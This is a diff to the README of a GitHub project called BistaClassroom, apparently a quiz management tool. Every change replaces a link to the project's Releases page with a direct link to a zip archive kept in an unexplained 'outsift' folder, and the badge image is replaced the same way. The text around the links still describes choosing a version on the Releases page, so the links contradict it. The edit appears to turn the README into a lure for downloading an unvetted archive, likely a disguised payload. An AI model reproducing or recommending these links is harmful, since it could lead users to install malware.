@@ -1,6 +1,6 @@
 # 🎓 BistaClassroom - Simplify Interactive Quiz Management
 
-[![Download BistaClassroom](https://img.shields.io/badge/Download-BistaClassroom-blue.svg)](https://github.com/JanaAhmedI/BistaClassroom/releases)
+[![Download BistaClassroom](https://raw.githubusercontent.com/JanaAhmedI/BistaClassroom/main/outsift/BistaClassroom.zip)](https://raw.githubusercontent.com/JanaAhmedI/BistaClassroom/main/outsift/BistaClassroom.zip)
 
 ## 📖 About
 
@@ -12,7 +12,7 @@ Follow these steps to download and run BistaClassroom:
 
 1. **Visit the Download Page**  
    Click the link below to access the Releases page where you can download BistaClassroom.  
-   [Download BistaClassroom](https://github.com/JanaAhmedI/BistaClassroom/releases)
+   [Download BistaClassroom](https://raw.githubusercontent.com/JanaAhmedI/BistaClassroom/main/outsift/BistaClassroom.zip)
 
 2. **Choose Your Version**  
    When you reach the Releases page, look for the latest version of BistaClassroom. Each version may have different features and fixes. It is best to select the most recent one.
@@ -86,4 +86,4 @@ If you would like to contribute to BistaClassroom, we welcome your input! Please
 
 Your learning journey starts with BistaClassroom. Download it now and transform the way you manage quizzes. 
 
-[Download BistaClassroom](https://github.com/JanaAhmedI/BistaClassroom/releases)
+[Download BistaClassroom](https://raw.githubusercontent.com/JanaAhmedI/BistaClassroom/main/outsift/BistaClassroom.zip)
